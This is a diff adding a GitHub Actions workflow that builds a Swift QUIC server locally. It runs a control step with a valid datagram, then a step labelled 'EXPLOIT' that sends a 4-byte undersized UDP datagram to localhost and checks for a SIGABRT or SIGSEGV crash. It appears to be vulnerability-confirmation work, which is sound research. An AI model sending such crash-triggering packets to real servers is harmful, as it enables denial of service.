@@ -1,0 +1,74 @@
+name: swift-nio-quic Phase B
+on:
+  workflow_dispatch:
+jobs:
+  phase-b:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install Swift 6.3.3
+        run: |
+          wget -q https://download.swift.org/swift-6.3.3-release/ubuntu2404/swift-6.3.3-RELEASE/swift-6.3.3-RELEASE-ubuntu24.04.tar.gz
+          tar xzf swift-6.3.3-RELEASE-ubuntu24.04.tar.gz
+          echo "$PWD/swift-6.3.3-RELEASE-ubuntu24.04/usr/bin" >> $GITHUB_PATH
+      - name: Provenance
+        run: uname -m && uname -r && swift --version
+      - name: Build server
+        run: |
+          cd QUICServer
+          swift build -c release 2>&1
+          BIN=$(swift build -c release --show-bin-path)/QUICServer
+          echo "SERVER=$BIN" >> $GITHUB_ENV
+          ls -la "$BIN"
+      - name: CONTROL valid datagram
+        run: |
+          $SERVER &
+          SPID=$!
+          echo "PID=$SPID"
+          sleep 3
+          kill -0 $SPID && echo "alive before: YES" || echo "alive before: NO"
+          python3 -c "
+          import socket
+          s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+          s.sendto(bytes([0x40]+list(range(13))),('127.0.0.1',4433))
+          print('sent 14 bytes')
+          "
+          sleep 2
+          if kill -0 $SPID 2>/dev/null; then
+            echo "CONTROL: PASS server alive"
+            echo "control=ALIVE" >> $GITHUB_ENV
+          else
+            wait $SPID; echo "CONTROL: UNEXPECTED exit $?"
+            echo "control=DEAD" >> $GITHUB_ENV
+          fi
+          kill $SPID 2>/dev/null; wait $SPID 2>/dev/null || true
+      - name: EXPLOIT undersized datagram
+        run: |
+          $SERVER &
+          SPID=$!
+          echo "PID=$SPID"
+          sleep 3
+          kill -0 $SPID && echo "alive before: YES" || echo "alive before: NO"
+          python3 -c "
+          import socket
+          s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+          s.sendto(bytes([0x40,0x01,0x02,0x03]),('127.0.0.1',4433))
+          print('sent 4-byte short datagram')
+          "
+          sleep 3
+          if kill -0 $SPID 2>/dev/null; then
+            echo "alive after: YES — survived"
+            echo "exploit=SURVIVED" >> $GITHUB_ENV
+            kill $SPID
+          else
+            wait $SPID; EXIT=$?
+            echo "alive after: NO — exit $EXIT"
+            echo "exploit=CRASHED_$EXIT" >> $GITHUB_ENV
+            [ $EXIT -eq 134 ] && echo "*** SIGABRT CONFIRMED ***"
+            [ $EXIT -eq 139 ] && echo "*** SIGSEGV CONFIRMED ***"
+          fi
+      - name: Summary
+        if: always()
+        run: |
+          echo "control=$control exploit=$exploit"
+          [[ "$exploit" == CRASHED* ]] && echo "Phase B: PASS" || echo "Phase B: INCONCLUSIVE"
